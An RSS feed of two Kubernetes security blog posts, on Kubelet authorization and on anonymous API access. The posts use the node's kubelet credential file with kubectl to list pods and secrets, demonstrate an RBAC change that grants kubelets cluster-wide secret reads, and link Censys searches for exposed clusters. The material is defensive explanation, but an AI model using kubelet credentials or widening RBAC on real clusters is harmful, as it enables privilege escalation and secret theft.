<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Raesene's Ramblings</title>
		<description>Things that occur to me</description>
		<link>https://raesene.github.io/</link>
		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Let's talk about Kubelet authorization</title>
				<description>&lt;p&gt;I’ve been meaning to write a post about Kubelet authorization for a while now, and as there have been some posts this week where it got a mention, now seems like a good time!&lt;/p&gt;

&lt;p&gt;The Kubelet is the Kubernetes component which runs on each worker (and possible control plane) node and is responsible for managing the container runtime on the host. It communicates with the Kubernetes API server to get information about workloads that should be running on the node and then instantiates them using a container runtime like Containerd. To do this, it obviously needs credentials to access the API server, and needs rights to things like pods and also associated objects like secrets.&lt;/p&gt;

&lt;p&gt;From a security perspective these Kubelet credentials are important as, if an attacker breaks out from a container to the underlying node, there will generally be a set of kubelet credentials available to them, so they could be used to escalate rights to the cluster, as a result it’s been necessary for the Kubernetes project to take steps to restrict what the Kubelet can do, to reduce the risk of privilege escalation.&lt;/p&gt;

&lt;h2 id=&quot;a-brief-aside---kubernetes-authorization-modes&quot;&gt;A Brief aside - Kubernetes authorization modes&lt;/h2&gt;

&lt;p&gt;An important aspect of Kubernetes to discuss before talking about exactly how Kubelet authorization works, is how Kubernetes generally handles authorization. Whilst most clusters will use RBAC, it’s possible to have multiple authorization modes in any cluster. Rights provided by each authorization mode are cumulative, so it’s important to be careful about inadvertently granting rights to users. Also, if you’re using Kubernetes in-built tooling for listing all of a users permissions (via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i --list&lt;/code&gt; command showne below), it’s worth noting that this &lt;em&gt;only&lt;/em&gt; works with RBAC, rights granted via other authorization modes will not be analyzed, although you can check for individual rights granted via any authorization mode using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i&lt;/code&gt; command.&lt;/p&gt;

&lt;h2 id=&quot;kubelet-authorization&quot;&gt;Kubelet authorization&lt;/h2&gt;

&lt;p&gt;Having talked about the fundamentals, let’s look at how Kubelet authorization works. We’ll start with a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt; cluster and look at what’s visible there.&lt;/p&gt;

&lt;p&gt;For this we’ll use a cluster with two worker nodes, using a simple kind config&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# three node (two workers) cluster config&lt;/span&gt;
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
- role: worker
- role: worker
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can start the cluster up with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster --config kind-config.yaml --name kubeletauthz&lt;/code&gt;. Once the cluster is up and running we can shell into one of the worker nodes to look at the Kubelet credentials. You can find out what Kubeconfig file the Kubelet is using by looking at the parameters passed to the Kubelet on the command line. In the case of Kubeadm the default will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--kubeconfig=/etc/kubernetes/kubelet.conf&lt;/code&gt;. Once we know the location we can use that with Kubectl, for example to see a listing of pods in the cluster&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf get po &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;
NAMESPACE            NAME                                                 READY   STATUS    RESTARTS   AGE
kube-system          coredns-787d4945fb-4rspx                             1/1     Running   0          4m43s
kube-system          coredns-787d4945fb-p5g6f                             1/1     Running   0          4m43s
kube-system          etcd-kubeletauthz-control-plane                      1/1     Running   0          4m56s
kube-system          kindnet-clmjl                                        1/1     Running   0          4m43s
kube-system          kindnet-jhngj                                        1/1     Running   0          4m26s
kube-system          kindnet-kjsvt                                        1/1     Running   0          4m27s
kube-system          kube-apiserver-kubeletauthz-control-plane            1/1     Running   0          4m55s
kube-system          kube-controller-manager-kubeletauthz-control-plane   1/1     Running   0          4m55s
kube-system          kube-proxy-9v62x                                     1/1     Running   0          4m43s
kube-system          kube-proxy-q8t5c                                     1/1     Running   0          4m26s
kube-system          kube-proxy-vnrt6                                     1/1     Running   0          4m27s
kube-system          kube-scheduler-kubeletauthz-control-plane            1/1     Running   0          4m56s
local-path-storage   local-path-provisioner-75f5b54ffd-52xm9              1/1     Running   0          4m43s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Usually to check the rights of a principal in Kubernetes we’d use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i --list&lt;/code&gt; and if we try that with the Kubelet credentials we get back something like this.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf auth can-i &lt;span class=&quot;nt&quot;&gt;--list&lt;/span&gt;
Warning: the list may be incomplete: node authorizer does not support user rule resolution
Resources                                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io                   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
selfsubjectrulesreviews.authorization.k8s.io                    &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
certificatesigningrequests.certificates.k8s.io/selfnodeclient   &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;create]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/api]              &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/apis]             &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/healthz]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/livez]            &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/openapi]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/readyz]           &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]         &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version/]         &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
                                                                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/version]          &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;get]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notably there are no rights to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pod&lt;/code&gt; objects that we just looked at! The clue to what’s going on here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Warning&lt;/code&gt; line at the top which notes that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node authorizor&lt;/code&gt; doesn’t support user rule resolution.&lt;/p&gt;

&lt;p&gt;One quick aside is that you may be confused by the Kubelet not using RBAC as there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:node&lt;/code&gt; which looks like it would provide rights to nodes, however the corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; doesn’t actually have any subjects (which is weird), so it has no effect!&lt;/p&gt;

&lt;h2 id=&quot;node-authorizer&quot;&gt;Node authorizer&lt;/h2&gt;

&lt;p&gt;The key to what’s going on here can be see in the configuration of the Kubernetes API server. If you look at the parameters passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; component you’ll see this stanza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--authorization-mode=Node,RBAC&lt;/code&gt; indicating that there are two modes of authorization configured and, as we said earlier, the rights from these are cumulative.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;https://kubernetes.io/docs/reference/access-authn-authz/node/&quot;&gt;Node authorization mode&lt;/a&gt; is an authorization mode with one purpose which is to provide rights to Kubelets. From the documentation page we can see that this authorization mode allows access to the kind of resources that the Kubelet needs to use like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configmaps&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets&lt;/code&gt;. Within that group it also needs to restrict &lt;em&gt;which&lt;/em&gt; secrets etc are actually accessible as you don’t want a Kubelet on one node to be able to access secrets intended for pods running on another node.&lt;/p&gt;

&lt;p&gt;The exact logic of what is allowed can be seen in &lt;a href=&quot;https://github.com/kubernetes/kubernetes/blob/bd190762fb77b78788e1a3ba72d70a8a08e184b8/plugin/pkg/auth/authorizer/node/node_authorizer.go#L41&quot;&gt;the code&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// NodeAuthorizer authorizes requests from kubelets, with the following logic:
// 1. If a request is not from a node &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NodeIdentity&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; returns &lt;span class=&quot;nv&quot;&gt;isNode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reject
// 2. If a specific node cannot be identified &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NodeIdentity&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; returns &lt;span class=&quot;nv&quot;&gt;nodeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reject
// 3. If a request is &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;a secret, configmap, persistent volume or persistent volume claim, reject unless the verb is get, and the requested object is related to the requesting node:
//    node &amp;lt;- configmap
//    node &amp;lt;- pod
//    node &amp;lt;- pod &amp;lt;- secret
//    node &amp;lt;- pod &amp;lt;- configmap
//    node &amp;lt;- pod &amp;lt;- pvc
//    node &amp;lt;- pod &amp;lt;- pvc &amp;lt;- pv
//    node &amp;lt;- pod &amp;lt;- pvc &amp;lt;- pv &amp;lt;- secret
// 4. For other resources, authorize all nodes uniformly using statically defined rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see this in effect if you try to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets&lt;/code&gt; from a cluster with Kubelet credentials&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf get secrets &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;
Error from server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Forbidden&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: secrets is forbidden: User &lt;span class=&quot;s2&quot;&gt;&quot;system:node:kubeletauthz-worker&quot;&lt;/span&gt; cannot list resource &lt;span class=&quot;s2&quot;&gt;&quot;secrets&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;API group &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; at the cluster scope: can only &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;namespaced object of this &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One important point to note on this is where the logic is “reject”, this just passes the request to other configured authorization modes, so if cluster RBAC has been modified to allow the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:nodes&lt;/code&gt; group to do something in excess of what the Node authorization mode allows then that will still be allowed.&lt;/p&gt;

&lt;p&gt;You can see this by, for example, editing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:node&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; to add the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:nodes&lt;/code&gt; group as a subject, by adding these lines to it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;subjects:
- apiGroup: rbac.authorization.k8s.io
  kind: Group
  name: system:nodes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve done that, if you use Kubelet credentials to try and get secrets at a cluster level, it works fine :)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl &lt;span class=&quot;nt&quot;&gt;--kubeconfig&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/kubernetes/kubelet.conf get secrets &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt;
NAMESPACE     NAME                     TYPE                            DATA   AGE
kube-system   bootstrap-token-abcdef   bootstrap.kubernetes.io/token   6      34m
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a couple of places where this mode can’t effectively restrict permissions, which are in node and pod properties, for that we need another component.&lt;/p&gt;

&lt;h2 id=&quot;noderestriction-admission-controller&quot;&gt;NodeRestriction Admission Controller&lt;/h2&gt;

&lt;p&gt;This is where a specialized admission controller comes in. The &lt;a href=&quot;https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#noderestriction&quot;&gt;NodeRestriction admission controller&lt;/a&gt; looks at requests from Kubelets and, where they relate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt; it limits the rights to only those that are appropriate for the Kubelet. For example it restricts what properties of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node&lt;/code&gt; objects can be modified, to stop it changing it’s own security classification, for example.&lt;/p&gt;

&lt;h2 id=&quot;variations-in-kubernetes-distributions&quot;&gt;Variations in Kubernetes distributions&lt;/h2&gt;

&lt;p&gt;It’s important to note that, as with most Kubernetes configuration topics, what we’ve discussed here relates to vanilla Kubernetes, in this case Kubeadm. Distribution providers are free to change this configuration and indeed some do so. For example Azure AKS currently defaults to allowing Kubelets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secrets&lt;/code&gt; at the cluster level!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;When looking at Kubernetes authorization it can be tempting to focus purely on RBAC as it’s the most common option deployed in Kubernetes clusters today. However as we’ve seen there are times when RBAC alone won’t provide an adequate level of security and supplemental authorization modes and admission controllers are required. In this post we’ve looked at the Node authorization mode and NodeRestriction admission controller which are used to provide rights to Kubelets to access the resources they need to function.&lt;/p&gt;

</description>
				<pubDate>Sat, 08 Apr 2023 15:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2023/04/08/lets-talk-about-kubelet-authorization/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/04/08/lets-talk-about-kubelet-authorization/</guid>
			</item>
		
			<item>
				<title>Let's talk about anonymous access to Kubernetes</title>
				<description>&lt;p&gt;This week there were some articles about the &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/first-known-dero-cryptojacking-operation-seen-targeting-kubernetes/&quot;&gt;Dero Cryptojacking operation&lt;/a&gt; and one of the details about what the attackers did caught my eye. It was mentioned that they were attacking clusters that allowed anonymous access to the Kubernetes API. Exactly how and why anonymous access is possible to Kubernetes is kind of an interesting topic that touches on a few different areas, so I thought I’d write a bit about it.&lt;/p&gt;

&lt;h2 id=&quot;how-does-anonymous-access-work&quot;&gt;How does anonymous access work?&lt;/h2&gt;

&lt;p&gt;Whether anonymous access works on a cluster is controlled by a flag on the &lt;a href=&quot;https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/&quot;&gt;kube-apiserver&lt;/a&gt; component. The flag is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth&lt;/code&gt; and it defaults to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, so if you don’t see it in the list of parameters passed to the server anonymous access will be enabled.&lt;/p&gt;

&lt;p&gt;However on it’s own that won’t actually give attackers a lot of access to the cluster, as it only covers one of the three gates a request passes through before it’s processed. As shown in the Kubernetes docs &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/controlling-access/&quot;&gt;controlling access&lt;/a&gt; section after authentication, the request then has to pass authorization and admission control.&lt;/p&gt;

&lt;h2 id=&quot;authorization-and-anonymous-access&quot;&gt;Authorization and anonymous access&lt;/h2&gt;

&lt;p&gt;So the next step is that a request will need to match an authorization policy (typically RBAC, but possibly others as well). Of course in order to do that the request has to be assigned to an identity, and that’s where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:anonymous&lt;/code&gt; user and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; group come in. These identities are assigned to any request that doesn’t have a valid authentication token, and are used to match against authorization policies.&lt;/p&gt;

&lt;p&gt;You can see this in action by looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; on a Kubeadm cluster.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRoleBinding&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;annotations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;rbac.authorization.kubernetes.io/autoupdate&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;true&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;kubernetes.io/bootstrapping&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac-defaults&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:public-info-viewer&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;roleRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:public-info-viewer&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Group&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:authenticated&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Group&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:unauthenticated&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;anonymous-access-in-the-wild&quot;&gt;Anonymous access in the wild&lt;/h2&gt;

&lt;p&gt;Now we know how anonymous access works, the question is going to be “how common is this?”. The answer is that most major distributions will enable anonymous access by default and will generally provide access to some limited number of endpoints via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; which provides access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/version&lt;/code&gt; endpoint along with a couple of others.&lt;/p&gt;

&lt;p&gt;To get a sense for how many clusters this applies to we can just use &lt;a href=&quot;https://search.censys.io/&quot;&gt;censys&lt;/a&gt; or &lt;a href=&quot;https://www.shodan.io/&quot;&gt;shodan&lt;/a&gt; to look for clusters that return version information. This &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;q=services.kubernetes.version_info.git_version%3D%22*%22&quot;&gt;censys query&lt;/a&gt; for example shows just over one million hosts that return version information, so we can say that it’s a fairly common configuration.&lt;/p&gt;

&lt;p&gt;A more serious question, which corresponds more to the points raised in the dero artice is, how many of these clusters would allow for an attacker to create workloads in them. Whilst you can’t get that exact information from Censys, it does have a query showing clusters that allow for anonymous users to enumerate pods in the cluster which shows &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;q=services.kubernetes.pod_names%3D%22*%22&quot;&gt;302 cluster nodes&lt;/a&gt; at time of writing. I’d guess some/most of those are honeypots, but also probably a couple of vulnerable clusters in there.&lt;/p&gt;

&lt;h2 id=&quot;disabling-anonymous-access&quot;&gt;Disabling anonymous access&lt;/h2&gt;

&lt;p&gt;On an unmanaged cluster (e.g. Rancher, Kubespray, Kubeadm) you can disable anonymous access by passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; flag to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; component. On managed clusters (e.g. EKS, GKE, AKS) you can’t do that, however what you can do is remove any RBAC rules which allow anonymous users to perform actions. For example, on a Kubeadm cluster you can remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; and that effectively stop anonymous users getting information from the cluster.&lt;/p&gt;

&lt;p&gt;Of course, if you have any applications that rely on those endpoints (for example for health checks) they would break, so it’s important to test any changes you make to the cluster. One option here would be to review your audit logs and see if there are any anonymous requests made to the API server.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Allowing some level of anonymous access is a common default in Kubernetes. In and of itself it’s not a great security concern, however it does mean that in many configurations the only thing stopping attackers compromising your cluster is RBAC rules, so a single mistake could cause significant issues, especially if your cluster is exposed to the internet.&lt;/p&gt;
</description>
				<pubDate>Sat, 18 Mar 2023 14:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/03/18/lets-talk-about-anonymous-access-to-Kubernetes/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/03/18/lets-talk-about-anonymous-access-to-Kubernetes/</guid>
			</item>
		
			<item>
